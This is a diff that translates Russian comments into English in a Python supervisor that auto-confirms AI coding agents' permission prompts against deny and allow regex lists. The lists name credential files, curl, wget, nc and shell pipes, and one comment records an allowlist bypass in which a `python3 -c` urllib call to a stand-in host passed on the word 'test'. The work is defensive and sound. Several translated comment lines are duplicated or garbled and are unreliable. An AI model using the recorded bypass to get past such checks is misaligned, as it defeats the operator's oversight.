@@ -698,19 +698,19 @@ def is_composer_empty(line: str) -> bool:
     if is_input_box_border(s):
         return True
     if is_input_box_hint(s):
-        return True  # подсказка пустого поля — не ввод
+        return True  # an empty-field hint — not input
     for marker in PROMPT_MARKERS:
         idx = s.rfind(marker)
         if idx != -1:
             tail = s[idx + len(marker):].strip()
-            # рамка TUI, рамки-разделители, курсор
+            # TUI frame, separator frames, cursor
             tail = re.sub(r"[\u2500-\u257f\u2588|]", "", tail).strip()
-            # TUI-подсказки и шорткаты в конце строки ввода (OpenCode / Claude Code
-            # / Codex): «⇧⇥ to change thinking effort», «ctrl+x commands». Стрелки
-            # убираются как глифы, а слова — только если ВЕСЬ остаток совпал с
-            # известной фразой. Не префиксом: вариант с `.*` после `ctrl\+x`
-            # объявлял бы пустым композер с настоящим текстом «ctrl+x не помогает…»,
-            # и пилот перезаписал бы чужой ввод.
+            # TUI hints and shortcuts at the input-line end (OpenCode / Claude Code
+            # / Codex): "⇧⇥ to change thinking effort", "ctrl+x commands". Arrows leave
+            # as glyphs, while words only match when the WHOLE remainder equals a known
+            # phrase. Never by prefix: the `.*`-suffixed `ctrl\+x` form would declare a
+            # composer with real text "ctrl+x does not help…" empty,
+            # and the pilot would overwrite another input.
             tail = re.sub(TUI_HINT_ARROWS, "", tail).strip()
             if tail and any(re.fullmatch(phrase, tail, re.IGNORECASE)
                             for phrase in TUI_HINT_PHRASES):
@@ -720,15 +720,15 @@ def is_composer_empty(line: str) -> bool:
 
 
 def composer_overflowed(lines: list) -> bool:
-    """Свёрнут ли длинный ввод в «↑ N more lines».
+    """Whether long input collapses into "↑ N more lines".
 
-    Проверка доставки ищет ХВОСТ набранного текста в строке композера. Когда текст
-    длиннее видимой области, TUI сворачивает его, и хвоста на экране нет — проверка
-    даёт ложный отказ при тексте, который на экране есть.
+    Delivery checks look for the TAIL of the typed text in the composer line. When
+    the text outgrows the visible area, the TUI collapses it, the tail leaves the
+    screen — and the check falsely refuses text that stands on screen.
 
-    Наблюдалось вживую: 4259 символов доставки легли в композер соседа, композер
-    показал «↑ 14 more lines», доставка была объявлена неподтверждённой, сообщение
-    продублировалось в ящик — и человек увидел одно и то же дважды.
+    Observed live: 4259 delivery chars landed in the neighbour composer, the
+    composer showed "↑ 14 more lines", delivery reported unconfirmed, the message
+    duplicated into the mailbox — and the human saw the same thing twice.
     """
     line = composer_line(lines)
     if line is None:
@@ -737,7 +737,7 @@ def composer_overflowed(lines: list) -> bool:
 
 
 def chunks(text: str, size: int = CHUNK_BYTES) -> list:
-    """Режем по границам слов, чтобы не разорвать идентификаторы."""
+    """Cut on word edges, never tearing identifiers."""
     out, buf = [], ""
     for word in text.split():
         candidate = (buf + " " + word) if buf else word
@@ -755,8 +755,8 @@ def type_text(tmux: str, pane: str, text: str) -> None:
     """Type in chunks, restoring the separator that chunking consumed.
 
     chunks() joins words with a space and drops it at every boundary, so sending the
-    pieces back to back loses one space per chunk: "должна найтись" arrived as
-    "должнанайтись". Harmless in prose, corrupting in a patch, so put it back.
+    pieces back to back loses one space per chunk: "must be found" arrived as
+    "mustbefound". Harmless in prose, corrupting in a patch, so put it back.
     """
     parts = chunks(text)
     for index, chunk in enumerate(parts):
@@ -785,20 +785,19 @@ def erase(tmux: str, pane: str, count: int) -> None:
 def tail_present(lines: list, needle: str) -> bool:
     """Did the typed text actually appear on screen?
 
-    The check is on the HEAD, not the tail, and это не переименование ради
-    красоты. Измерено в своём же композере: текст длиннее экрана рисуется от
-    начала, а всё, что ниже, уходит за нижнюю границу и в `capture` не попадает
-    вовсе. Проверка хвоста для такого текста не может сработать никогда — она
-    и не срабатывала, поэтому доставка длинных сообщений всякий раз объявлялась
-    неподтверждённой, хотя текст доходил и сосед его выполнял.
+    The check reads the HEAD, not the tail — no renaming for beauty. Measured in
+    our own composer: over-screen text draws from the start, while everything below
+    leaves past the bottom edge and never reaches `capture` at all. A tail check for
+    such text can never fire — and never fired, so every long-message delivery
+    reported unconfirmed while the text landed and the neighbour ran it.
 
-    Старая версия искала хвост по другой причине: курсор стоит внизу, а напечатанное
-    остаётся наверху, поэтому «последние строки» — это пустое. Но и «начало» там
-    не искалось — просто не оказалось нужным, пока тексты были короткими.
+    The old version sought the tail for another reason: the cursor sits at the
+    bottom while typed text stays on top, so "last lines" means empty. But no
+    "start" was sought there either — simply unneeded while texts ran short.
 
-    Проверяется начало, потому что оно единственное гарантированно видно. Хвост
-    как дополнительный признак тоже годится: если текст поместился целиком, то
-    видно и то, и другое, и совпадение по хвосту подтверждает доставку сильнее.
+    The start checks because it alone is guaranteed visible. The tail also serves
+    as an extra mark: when the whole text fits, both show, and a tail match confirms
+    delivery stronger.
     """
     meaningful = [line for line in lines if line.strip()]
     joined = " ".join(" ".join(meaningful).split())
@@ -819,8 +818,8 @@ PERMISSION_PATTERNS = (
     r"\bDo you allow this tool call\?",
 )
 
-# Промпт-меню: TUI показывает не «[y/N]», а список вариантов с подсказкой про
-# выбор и подтверждение. Клавиши там другие, и «y» не значит согласие.
+# Prompt menu: the TUI shows no "[y/N]" but an option list with a select-and-
+# confirm hint. Different keys there, and "y" never means agreement.
 PERMISSION_MENU_MARKERS = (
     r"allow\s+once",
     r"always\s+allow",
@@ -829,22 +828,22 @@ PERMISSION_MENU_MARKERS = (
 )
 PERMISSION_HEADER = re.compile(r"permission\s+(?:required|needed)", re.IGNORECASE)
 
-# Пункт меню, который разрешает операцию, вместе с его цифрой. Два вида меню
-# встречаются в живых TUI: горизонтальное (`Allow once · Always allow · Reject`
-# с `⇆ select`) — там Enter жмёт выбранный пункт, и нумерованное
-# (`1) Allow once  2) Always allow  3) Deny`) — там Enter жмёт ДЕФОЛТ, а им
-# часто оказывается отказ. Цифра шлётся только когда пункт явно разрешающий:
-# «Allow once» предпочитается «Always allow» — минимальная привилегия.
+# The menu item allowing the op, with its digit. Two live menu kinds in real
+# TUIs: horizontal (`Allow once · Always allow · Reject` with `⇆ select`) — Enter
+# presses the selected item there — and numbered (`1) Allow once  2) Always allow
+#  3) Deny`) — Enter presses the DEFAULT there, often a refusal. The digit sends
+# only when the item explicitly allows: `Allow once` beats `Always allow` — least
+# privilege.
 MENU_ALLOW_ITEM = re.compile(
     r"^\s*(\d+)\s*[).:\]]\s*(Allow\s+once|Always\s+allow|Allow|Yes)\b", re.IGNORECASE)
 
 
 def menu_allow_key(lines: list) -> str | None:
-    """Цифра разрешающего пункта нумерованного меню, либо None.
+    """The digit of the allowing item in a numbered menu, or None.
 
-    None — это тоже ответ: меню не нумеровано (горизонтальное), и жать надо
-    Enter по выделенному пункту, как было. Угадывать цифру нельзя: пункт
-    «Deny» нумерован так же, как «Allow».
+    None answers too: the menu runs unnumbered (horizontal), and Enter presses the
+    selected item as before. Guessing the digit is banned: the `Deny` item numbers
+    just like `Allow`.
     """
     once: str | None = None
     always: str | None = None
@@ -861,15 +860,15 @@ def menu_allow_key(lines: list) -> str | None:
 
 
 def detect_permission_menu(lines: list) -> str | None:
-    """Промпт в виде меню, а не «y/N». Вернёт строку-заголовок или None.
+    """A prompt shaped as a menu, not "y/N". Returns the header line or None.
 
-    Отдельная функция вместо расширения detect_permission_prompt: тот смотрит
-    только на две последние непустые строки, а в меню заголовок «Permission
-    required» стоит на шесть строк выше самых нижних. Расширять его окно значило
-    бы ловить эту строку в обычном выводе, где она ничего не разрешает.
+    A separate function instead of widening detect_permission_prompt: that one reads
+    only the last two nonempty lines, while in a menu the "Permission required"
+    header stands six lines above the bottom ones. Widening its window would catch
+    that line in ordinary output, where it allows nothing.
 
-    Нужен и заголовок, и признаки меню: по одному признаку это ещё не промпт,
-    а по одному заголовку — обычный лог.
+    Both the header and the menu marks are needed: one mark alone is no prompt yet,
+    and one header alone is an ordinary log.
     """
     text = [line.strip() for line in lines if line.strip()]
     joined = "\n".join(text)
@@ -884,22 +883,21 @@ def detect_permission_menu(lines: list) -> str | None:
 
 
 def extract_permission_context(lines: list, prompt: str) -> str:
-    """Текст, по которому выносится вердикт.
+    """The text the verdict reads.
 
-    Для меню нужен весь экран: команда, которую видно как «$ git status», живёт в
-    теле модалки, а не в заголовке. По одному заголовке «Permission required» белый
-    список не разрешит ничего и откажет всегда.
+    A menu needs the whole screen: the command showing as `$ git status` lives in
+    the modal body, not the header. On the header alone ("Permission required") the
+    allowlist allows nothing and always refuses.
 
-    Для «y/N» раньше хватало самой строки вопроса, и на Claude Code это было
-    ошибкой: там вопрос идёт последней строкой, а команда — предпоследней, так
-    что вердикт выносился по строке без единого слова о команде и отказывал
-    100% безопасных команд. То есть режим auto на Claude Code просто не работал.
+    For "y/N" the question line alone used to suffice, and on Claude Code that was
+    a bug: the question runs last there while the command runs second to last, so
+    the verdict read a line with zero words about the command and refused 100% of
+    safe commands. Auto mode on Claude Code simply never worked.
 
-    Поэтому берём и строку вопроса, и строки над ней — но не весь экран: лишний
-    текст мог бы разрешиться по слову, которое к команде отношения не имеет.
-    Верхняя граница — OVERSCAN_LINES строк, и это решение открытое: agy спросил,
-    две, три или до разделителя, и я выбрал три с запасом на рамку между
-    командой и вопросом.
+    So both the question line and the lines above read — but never the whole screen:
+    extra text could allow on a word unrelated to the command. The top edge is
+    OVERSCAN_LINES lines, an open decision: agy asked two, three or till the
+    separator, and I took three with margin for the frame between command and question.
     """
     text = [line.strip() for line in lines if line.strip()]
     joined = "\n".join(text)
@@ -922,9 +920,9 @@ def detect_permission_prompt(lines: list) -> str | None:
     return None
 
 
-# Шесть стоп-категорий PROTOCOL.md §12 плюс всё, что меняет состояние вне
-# репозитория. Совпадение с любым из них запрещает автоподтверждение при любом
-# белом списке: решение человека не переопределяется настройкой инструмента.
+# The six PROTOCOL.md §12 stop categories plus everything changing state outside
+# the repo. A match on any of them bans self-confirmation under any allowlist:
+# the human decision never yields to a tool setting.
 NEVER_ALLOW_PATTERNS = (
     r"\.env\b",
     r"\bsecrets?\b",
@@ -932,9 +930,9 @@ NEVER_ALLOW_PATTERNS = (
     r"\bapi[_ -]?keys?\b",
     r"\bpasswords?\b",
     r"\bcredentials?\b",
-    # Чтение тоже умеет красть. `cat` стоит в белом списке как чтение, поэтому
-    # путь к секрету должен быть запрещён сам по себе, иначе «прочитать ключ» —
-    # это разрешённое чтение.
+    # Reading steals too. `cat` allowlists as reading, so the secret path itself
+    # must ban: otherwise "read the key" counts as allowed reading.
+    # that counts as allowed reading.
     r"\.ssh\b",
     r"id_rsa|id_dsa|id_ecdsa|id_ed25519",
     r"/etc/(?:shadow|passwd|sudoers)",
@@ -943,19 +941,19 @@ NEVER_ALLOW_PATTERNS = (
     r"\.aws\b",
     r"\.git-credentials\b",
     r"\.kube/config",
-    # Назначение cp/mv/ln за пределами проекта: запись туда, куда агент
-    # писать не должен. Первый аргумент (источник) уже ограничивают
-    # allow-паттерны, а второй (назначение) не проверял никто:
-    # `cp test.txt /etc/passwd` получал allow. Исключения — /tmp (свои
-    # времянки, та же граница что у touch/mkdir/printf) и /dev/null.
+    # cp/mv/ln assignments past the project: writing where the agent must never
+    # write. The first arg (source) already binds allow-patterns, while the second
+    # (target) nobody checked: `cp test.txt /etc/passwd` passed allow. Exceptions —
+    # /tmp (own temp files, same edge as touch/mkdir/printf) and /dev/null.
+    # A bare /tmp, /tmp/* and rm -rf / stay refuse (see NEVER above).
     r"\b(?:cp|mv|ln)\b[^\n]*?\s/(?!tmp/|dev/null\b)",
-    # Труба в шелл превращает любое чтение в выполнение.
+    # A pipe into a shell turns any read into execution.
     r"\|\s*(?:sudo\s+)?(?:ba|z|k|da)?sh\b",
-    # Код, переданный интерпретатору строкой, — это произвольное выполнение, а не
-    # проверка. Именно так выглядел обход белого списка:
+    # Code handed to an interpreter as a string is arbitrary execution, not a check.
+    # That is exactly how the allowlist bypass looked:
     # `python3 -c "import urllib.request; urllib.request.urlopen('http://x')" # test`
-    # Слово «test» в комментарии удовлетворяло шаблону разрешения, а `urllib` в
-    # запрещённых категориях не значится — сеть через него не отлавливалась.
+    # The word "test" in a comment satisfied the allow pattern, while `urllib` never
+    # stood in the banned categories — network through it went uncaught.
     r"\b(?:python3?|node|ruby|perl)\s+-c\b",
     r"\$\(",
     r"`",
@@ -976,9 +974,9 @@ NEVER_ALLOW_PATTERNS = (
     r"\bdrop\s+(?:table|database)\b",
     r"\btruncate\b",
     r"\bdelete\s+(?:from|all)\b",
-    # §10: «в main не пушат никогда». Push в фиче-ветку и создание PR — часть
-    # работы по протоколу, поэтому запрещён не push вообще, а push в main/master
-    # и переписывание истории.
+    # §10: never push into main. Pushing a feature branch and opening a PR is protocol
+    # work, so banned is not push at large but push into main/master plus history
+    # rewrites.
     r"\bgit\s+push\b[^\n]*\b(?:main|master)\b",
     r"\bgit\s+push\b[^\n]*--force\b",
     r"\bgit\s+reset\s+--hard\b",
@@ -986,11 +984,11 @@ NEVER_ALLOW_PATTERNS = (
     r"\bgit\s+filter-branch\b",
     r"\bgit\s+reflog\s+expire\b",
     r"\bgit\s+rebase\b[^\n]*\b(?:main|master)\b",
-    # Деструкция системы. Внутри проекта rm -rf build/ — обычная уборка, и её
-    # нельзя запрещать вместе с rm -rf /: разница не в команде, а в цели.
-    # /tmp — именованные одноуровневые подпути без глобов (уборка своих
-    # времянок): вырез ниже сужает гард ровно на них, голый /tmp, /tmp/*
-    # и rm -rf / остаются refuse и проверяются тестами.
+    # System destruction. Inside the project rm -rf build/ is routine cleanup, never
+    # bannable next to rm -rf /: the difference sits in the target, not the command.
+    # /tmp means named single-level subpaths with no globs (own temp cleanup): the cut
+    # below narrows the guard to exactly them; bare /tmp, /tmp/* and rm -rf / stay
+    # refuse, covered by tests.
     r"\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+(?:~|\$HOME|\*|\.\s*$|\.\.)",
     r"\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+/(?!tmp/[A-Za-z0-9_.-]+(?:\s|$))",
     r"\brm\s+-[a-zA-Z]*[rf][a-zA-Z]*\s+/tmp(?:\s|$|/\*|/\.?$)",
@@ -1000,55 +998,55 @@ NEVER_ALLOW_PATTERNS = (
     r"\bchmod\s+777\b",
     r"\bprod(?:uction)?\b",
     r":\d{2,5}\b",
-    # Сеть. Не потому что сеть опасна сама по себе, а потому что она позволяет
-    # вынести наружу то, что §12 защищает, и скачать то, что не проверял никто.
+    # Network. Not because the network is dangerous alone, but because it carries out
+    # what §12 guards and downloads what nobody checked.
     r"\bcurl\b",
     r"\bwget\b",
     r"\bnc\b\s+-",
-    # Установка пакетов тянет чужой код в проект и меняет окружение оператора.
+    # Package installs drag foreign code into the project and change the operator env.
     r"\bpip[23]?\s+install\b",
     r"\bnpm\s+install\b",
-    # Запуск тестов на хосте — произвольный код от прав оператора (P0).
-    # Тесты выполняются изолированно через scripts/run-isolated-test.sh
-    # (контейнер без сети и без $HOME); прямой запуск на хосте
-    # автоподтверждению не подлежит — только человек. Паттерн намеренно
-    # широкий: `pytest -q`, `python3 -m pytest`, `bun test`, `cargo test`.
-    # Честная граница: прямой `python3 path/to/test_foo.py` (слово не в конце
-    # токена) этим не ловится — allow-паттерн интерпретатора его покрывает.
-    # Полный разбор argv вместо regex — вне P0-скоупа, см. THREAT_MODEL.md.
-    # Проверка ниже в permission_verdict: сегмент с run-isolated-test.sh
-    # пропускает тестовые NEVER-паттерны (но не остальные: сеть, секреты,
-    # sudo по-прежнему refuse даже внутри раннера).
+    # Running tests on the host means arbitrary code with operator rights (P0).
+    # Tests run isolated through scripts/run-isolated-test.sh (a container with no
+    # network and no $HOME); a direct host run never self-confirms — human only. The
+    # pattern deliberately runs wide: `pytest -q`, `python3 -m pytest`, `bun test`, `cargo test`.
+    # Honest edge: a direct `python3 path/to/test_foo.py` (word not at token end) escapes
+    # this — the interpreter allow-pattern covers it. A full argv parse instead of regex
+    # sits past the P0 scope, see THREAT_MODEL.md.
+    # The check below in permission_verdict: the run-isolated-test.sh segment skips the
+    # The check below in permission_verdict: the run-isolated-test.sh segment skips the
+    # test NEVER-patterns (but not the rest: network, secrets, sudo still refuse inside).
+    # sudo still refuses even inside the runner).
     r"\bpytest\b",
     r"\b(?:python3?|node|ruby)\s+(?:-\S+\s+)*(?:[^\s]*[_./-]?)(?:test|tests|pytest|unittest)\b",
     r"\b(?:jest|vitest|mocha|rspec|nox|tox|nose|unittest)\b",
     r"\b(?:cargo\s+test|go\s+test)\b",
     r"\b(?:bun\s+(?:test|run\s+test)|npm\s+(?:test|ci))\b",
     r"\bnpm\s+publish\b",
-    # Префикс-переменные окружения меняют поведение процесса без изменения
-    # самой команды: LD_PRELOAD подменяет библиотеки, PYTHONPATH/NODE_PATH —
-    # код, который интерпретатор загрузит. `LD_PRELOAD=/tmp/x.so pytest` —
-    # это уже не «свои тесты», а чужая библиотека в процессе тестов.
-    # Список закрытый: PATH/HOME/TZ/LANG и подобные поведение не меняют
-    # так, чтобы это обходило allow-проверку, и остаются разрешены.
+    # Env-prefix variables change the process behaviour without changing the command
+    # itself: LD_PRELOAD swaps libraries, PYTHONPATH/NODE_PATH swap the code the
+    # interpreter loads. `LD_PRELOAD=/tmp/x.so pytest` is no longer "own tests" but
+    # another library inside the test process.
+    # Closed list: PATH/HOME/TZ/LANG and alike never change behaviour past the
+    # allow-check, and stay allowed.
     r"(?:^|[\s;&|])LD_PRELOAD\s*=",
     r"(?:^|[\s;&|])(?:PYTHONPATH|PYTHONHOME|NODE_PATH|RUBYLIB|PERL5LIB|LD_LIBRARY_PATH)\s*=",
 )
 
-# Белый список по умолчанию: чтение плюс локальная работа внутри проекта.
+# The default allowlist: reading plus local work inside the project.
 #
-# Границу провели там, где она проходит по §10 и §12, а не там, где строго:
-# §10 требует коммитов и PR, поэтому «только чтение» парализует пару, а §12
-# запрещает не «работу», а конкретные вещи — секреты, деплой, миграции,
-# удаление данных и истории git, прод. Запрещённое остаётся запрещённым при любом
-# белом списке (см. NEVER_ALLOW_PATTERNS), а разрешённое здесь — это работа, которую
-# протокол и так обязан делать без человека.
+# The edge runs where §10 and §12 draw it, not where strictest: §10 demands
+# commits and PRs, so "reads only" paralyzes the pair, while §12 bans not "work"
+# but concrete things — secrets, deploys, migrations, data and git-history
+# deletion, prod. Banned stays banned under any allowlist (see NEVER_ALLOW_PATTERNS),
+# while allowed here is the work the protocol must do with no human anyway.
+# the protocol owes with no human anyway.
 #
-# Чего здесь нет и почему: сетевых вызовов (curl/wget) и `ssh`. «Позволить сеть» —
-# это не про чтение файлов, это про возможность вынести их наружу, а §12 про секреты
-# не делает исключений на «только чтение».
+# What misses here and why: network calls (curl/wget) and `ssh`. "Allow network"
+# is not about reading files but about carrying them out, while §12 on secrets
+# grants no "reads only" exception.
 DEFAULT_ALLOW_PATTERNS = (
-    # чтение
+    # reading
     r"\bRead\b",
     r"\bread_file\b",
     r"\bview\b",
@@ -1061,7 +1059,7 @@ DEFAULT_ALLOW_PATTERNS = (
     r"\btail\b",
     r"\bls\b",
     r"\bfind\b",
-    # правка внутри проекта
+    # editing inside the project
     r"\bwrite\b",
     r"\bedit\b",
     r"\bcreate\b",
@@ -1070,91 +1068,91 @@ DEFAULT_ALLOW_PATTERNS = (
     r"\bapply\b",
     r"\bformat\b",
     r"\blint\b",
-    # локальные проверки: тесты и сборки
+    # local checks: tests and builds
     r"\b(?:pytest|unittest|nose|tox|nox|jest|vitest|mocha|rspec|cargo\s+test|go\s+test)\b",
     r"\b(?:ruff|flake8|pylint|mypy|pyright|eslint|prettier|tsc|black|isort)\b",
-    # Интерпретатор с проверкой в команде: `python3 -m pytest`,
-    # `python3 mcp/pair_mailbox/test_protocol.py`, `node --test`. Ключевое слово
-    # должно быть АРГУМЕНТОМ. Прежний `[^\n]*` позволял ему всплыть откуда угодно
-    # дальше по строке, и хватало слова «test» в комментарии или внутри строковой
-    # константы — см. NEVER_ALLOW_PATTERNS про `-c`.
+    # Interpreter with a check in the command: `python3 -m pytest`,
+    # `python3 mcp/pair_mailbox/test_protocol.py`, `node --test`. The keyword must be
+    # an ARGUMENT. The old `[^\n]*` let it surface from anywhere further down the
+    # line, and the word "test" in a comment or inside a string constant sufficed —
+    # see NEVER_ALLOW_PATTERNS on `-c`.
     r"\b(?:python3?|node|ruby)\s+(?:-\S+\s+)*(?:[^\s]*[_./-]?)(?:test|tests|pytest|unittest|lint|check|build)",
     r"\bmake\b",
     r"\bnpm\s+(?:run\s+\w+|test|ci)\b",
-    # bun — рантайм, на котором крутятся omp и pi (pane_current_command показал
-    # bun на панелях пары): bun test / bun run / bun x — та же работа, что
-    # pytest напрямую, и без этого агент вставал на промпте рутины.
+    # bun is the runtime omp and pi turn on (pane_current_command showed bun on pair
+    # panes): bun test / bun run / bun x is the same work as pytest directly, without
+    # which the agent stalled on the routine prompt.
     r"\bbun\s+(?:test|run|x)\b",
     r"\bbuild\b",
-    # Наши раннеры из bin/: pairup/pairpilot/pair-duo/pairchat/pairctl/pairwatch/
-    # pairdoctor/pairboard. Относительность и защита от .. те же, что у scripts/.
-    # Имена с префикссом pair — все: семья инструментов одной ответственности.
+    # Our bin/ runners: pairup/pairpilot/pair-duo/pairchat/pairctl/pairwatch/pairdoctor/
+    # pairboard. Relativity and `..` guard match scripts/.
+    # Pair-prefixed names — all: one-responsibility tool family.
     r"\bbash\s+bin/(?!/)(?![^\s]*\.\.)pair[a-z-]*\b",
-    # Прямой запуск раннера: `bin/pairup` в начале команды. `(?<!\S)` — перед
-    # `bin/` только пробел или начало строки: иначе `/usr/local/bin/pairup`
-    # матчится как «наш раннер», а это чужой путь извне проекта.
+    # A direct runner launch: `bin/pairup` at the command start. `(?<!\S)` means only
+    # space or line start before `bin/`: or `/usr/local/bin/pairup` matches as "our
+    # runner" while a foreign path from outside the project.
     r"(?<!\S)bin/(?!/)(?![^\s]*\.\.)pair[a-z-]*\b",
-    # Свои гейты через bash: verify-project, file-size-gate, eye-of-sauron,
-    # comment-lint, security-scan и *_test.sh. Относительность в самом паттерне:
-    # `scripts/` без `/` и `..` впереди — абсолютный путь и выход из проекта
-    # не матчатся здесь, а не только в тестах. Задача seq 329: рутинные прогоны
-    # требовали ручного Allow, хотя это та же работа, что pytest напрямую.
+    # Our bash gates: verify-project, file-size-gate, eye-of-sauron, comment-lint,
+    # security-scan and *_test.sh. Relativity inside the pattern itself: `scripts/` with
+    # no `/` or `..` ahead — an absolute path or a project escape never matches here,
+    # not only in tests. Task seq 329: routine runs demanded manual Allow for the same
+    # work as pytest directly.
     r"\bbash\s+scripts/(?!/)(?![^\s]*\.\.)[A-Za-z0-9_.-]+\.sh\b",
-    # Наблюдение без записи: чтение состояния, а не изменение (§12 не задевают).
-    # Чистое наблюдение — без редиректа (>), без -i, без -o: printf > /etc,
-    # sed -i /etc, sort -o /etc — это запись вне проекта, а не наблюдение.
-    # awk — refuse (тот же класс, что python3 -c: system()/pipe исполняют);
-    # trap/export — refuse (безопасность в значении, матчем не отличить).
+    # Observation with no write: state reading, never changing (§12 untouched).
+    # Clean observation — no redirect (>), no -i, no -o: printf > /etc, sed -i /etc,
+    # sort -o /etc writes outside the project, not observation.
+    # awk means refuse (the python3 -c class: system()/pipe execute);
+    # trap/export mean refuse (safety in the value, no match tells apart).
     r"\b(?:date|du|wc|sleep|mktemp|which|command|echo|uptime|uniq|cut|tr|diff)\b",
     r"\b(?:mkdir|touch)\s+(?:-[a-zA-Z]+\s+)*(?:(?![/~$*])(?!\.{1,2}(?:\s|$))[^\s-]+|/tmp/[A-Za-z0-9_.-]+(?:/[A-Za-z0-9_.-]+)*)",
     r"\b(?:printf|sort)\b(?![^\n]*\s*>+\s*/(?!tmp/|dev/null))(?![^\n]*\s-o\s*/(?!tmp/))(?![^\n]*>+/(?!tmp/|dev/null))",
     r"\bsed\b(?![^\n]*-i[^\n]*\s/(?!tmp/))(?![^\n]*-i/(?!tmp/))",
     r"\bgit\s+check-ignore\b",
     r"\bpython3\s+--version\b",
-    # Файловые операции внутри проекта и /tmp: cp/mv/ln, rm файла
-    # без флагов, rm -rf одноуровневых именованных подпутей /tmp без глобов.
-    # Голый /tmp, /tmp/* и rm -rf / остаются refuse (см. NEVER выше).
-    # touch/mkdir — выше, в скоупе observe (те же границы).
+    # File ops inside the project and /tmp: cp/mv/ln, flagless file rm, rm -rf of
+    # named single-level /tmp subpaths with no globs. Bare /tmp, /tmp/* and rm -rf /
+    # stay refuse (see NEVER above).
+    # touch/mkdir live above, in the observe scope (same edges).
     r"\b(?:cp|mv|ln)\s+(?:(?![/~$*])(?!\.{1,2}(?:\s|$))[^\s]+|/tmp/[A-Za-z0-9_.-]+(?:/[A-Za-z0-9_.-]+)*)",
     r"\brm\s+(?:(?![/~$*./-])(?!\.{1,2}(?:\s|$))[^\s]+|/tmp/[A-Za-z0-9_.-]+(?:/[A-Za-z0-9_.-]+)*)",
     r"\brm\s+-[a-zA-Z]+\s+(?:(?![/~$*])(?!\.{1,2}(?:\s|$))[^\s]+|/tmp/[A-Za-z0-9_.-]+)",
-    # локальный git: §10 требует ветку и коммит, поэтому это разрешено
+    # local git: §10 demands a branch and a commit, so this is allowed;
     r"\bgit\s+(?:status|diff|log|show|branch|remote|describe|rev-parse|add|commit|"
     r"checkout|switch|stash|tag|blame|shortlog|reflog)\b",
-    # отправка работы: push в фиче-ветку и PR. Запрет push в main/master и
-    # --force стоит в NEVER_ALLOW_PATTERNS и проверяется первым.
+    # shipping the work: push into a feature branch and PR. The ban on push into
+    # main/master plus --force sits in NEVER_ALLOW_PATTERNS, checked first.
     r"\bgit\s+push\b",
     r"\bgh\s+(?:pr|issue|run|workflow)\b",
 )
 
 
 def load_allow_patterns(spec: str | None) -> tuple[list[str], bool]:
-    """Прочитать белый список разрешений: JSON-файл или список шаблонов.
+    """Read the permission allowlist: a JSON file or a pattern list.
 
-    Возвращает (шаблоны, работали_ли_мы_на_дефолтных).
+    Returns (patterns, whether_we_ran_on_defaults).
 
-    Раньше здесь стояло «пусто = не подтверждать ничего», и это привело к тому, что
-    сверхвизор не подтверждал вообще ничего: файла `.pair/permissions.json` не
-    существует, путь к нему превращался в единственный шаблон '.pair/permissions.json',
-    он не находился в тексте промпта — и каждый запрос получал отказ. Снаружи это
-    выглядело как «сосед перестал подтверждать».
+    "Empty means confirm nothing" used to stand here, and the supervisor ended up
+    confirming nothing at all: no `.pair/permissions.json` file exists, its path
+    turned into the only pattern '.pair/permissions.json', never met the prompt
+    text — and every request refused. From outside that read as "the neighbour
+    stopped confirming".
 
-    Теперь граница та, что задал человек: внутри проекта можно всё, что нужно для
-    работы, запрещено то, что вредит системе, чужому проекту или необратимо стирает.
-    Это ровно DEFAULT_ALLOW_PATTERNS плюс NEVER_ALLOW_PATTERNS поверх, который
-    проверяется первым. Отсутствие файла означает «работай на списке по умолчанию»,
-    а не «не подтверждать ничего»; файл по-прежнему сужает и расширяет.
+    Now the edge is what the human set: inside the project everything the work
+    needs is allowed; what harms the system, another project or wipes irreversibly
+    is banned. Exactly DEFAULT_ALLOW_PATTERNS plus NEVER_ALLOW_PATTERNS on top,
+    checked first. A missing file means "run on the default list", never "confirm
+    nothing"; the file still narrows and widens.
 
-    Явный пустой список — это осознанный отказ от автоподтверждения, и он
-    отличается от отсутствующего файла. Нечитаемый файл даёт пустой: сломанная
-    настройка не должна молча расширять права.
+    An explicit empty list is a deliberate self-confirm refusal, distinct from a
+    missing file. An unreadable file yields empty: a broken setting must never
+    silently widen rights.
     """
     if spec is None:
         return list(DEFAULT_ALLOW_PATTERNS), True
     if not str(spec).strip():
-        # Пустая строка — это осознанный отказ от автоподтверждения, и он отличается
-        # от отсутствующего файла. Разница видна только в этой функции, поэтому
-        # различаем здесь, а не в вызывающем коде.
+        # An empty line is a deliberate self-confirm refusal, and it differs from a
+        # missing file. The difference shows only in this function, so tell apart here,
+        # not in the caller.
         return [], False
     text = str(spec).strip()
     try:
@@ -1165,19 +1163,19 @@ def load_allow_patterns(spec: str | None) -> tuple[list[str], bool]:
         try:
             raw: object = json.loads(candidate.read_text(encoding="utf-8"))
         except (OSError, ValueError):
-            # Файл есть и он сломан. Молча брать дефолты здесь нельзя: оператор
-            # явно что-то настраивал, и тихо откатывать его настройку к дефолту —
-            # хуже, чем остановиться и сказать.
+            # The file exists and is broken. Silently taking defaults is banned: the operator
+            # configured something explicitly, and quietly rolling its setting back to default beats
+            # stopping and telling for worse.
             return [], False
     else:
-        # Строка без запятых и без существующего файла. Раньше она становилась
-        # шаблоном целиком, и это молча ломало автоподтверждение; теперь это
-        # читается как список из одного элемента только если в строке есть запятые.
+        # A comma-less line with no existing file. It used to become the whole pattern,
+        # silently breaking self-confirm; now it reads as a one-item list only when the
+        # line holds commas.
         parts = [part.strip() for part in text.split(",") if part.strip()]
-        # Путь к несуществующему файлу — это тоже «настройки нет», а не шаблон.
-        # Раньше именно он становился единственным шаблоном ('.pair/permissions.json')
-        # и не находился в тексте промпта, то есть автоподтверждение не работало
-        # никогда. Список через запятую — настоящая настройка и читается как список.
+        # A path to a missing file also means "no settings", not a pattern. It used to
+        # become the only pattern ('.pair/permissions.json') and never met the prompt text —
+        # self-confirm never worked. A comma list is a real setting and reads as a list.
+        # never worked. A comma list is a real setting and reads as a list.
         if len(parts) == 1 and ("/" in parts[0] or "\\" in parts[0]):
             return list(DEFAULT_ALLOW_PATTERNS), True
         return parts, False
@@ -1189,15 +1187,14 @@ def load_allow_patterns(spec: str | None) -> tuple[list[str], bool]:
 
 
 def split_command_segments(prompt: str) -> list[str]:
-    """Разбить строку на команды по шелл-разделителям вне кавычек.
+    """Split the line into commands on shell separators outside quotes.
 
-    Разбор через shlex в режиме punctuation_chars: `;`, `&&`, `||`, `|` и `&`
-    выделяются в отдельные токены даже без пробелов (`pytest;rm`, `a||b`),
